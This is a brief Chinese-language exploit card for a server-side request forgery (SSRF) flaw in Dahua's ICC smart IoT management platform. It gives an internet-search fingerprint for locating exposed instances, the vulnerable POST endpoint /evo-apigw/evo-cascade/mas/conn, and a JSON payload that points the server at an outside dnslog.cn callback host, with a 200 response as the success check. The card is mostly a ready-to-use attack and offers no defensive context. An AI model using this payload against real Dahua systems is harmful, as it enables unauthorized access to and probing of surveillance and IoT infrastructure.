# 大华ICC智能物联综合管理平台masconn存在SSRF漏洞

大华 ｜ SSRF ｜ —
- **指纹**：`body="static/qwebchannel.js"`
- **请求**：`POST /evo-apigw/evo-cascade/mas/conn HTTP/1.1`

**Payload**
```
"masPort": "80",
"masIp": "9bp1oi.dnslog.cn"
```
- **响应特征**：200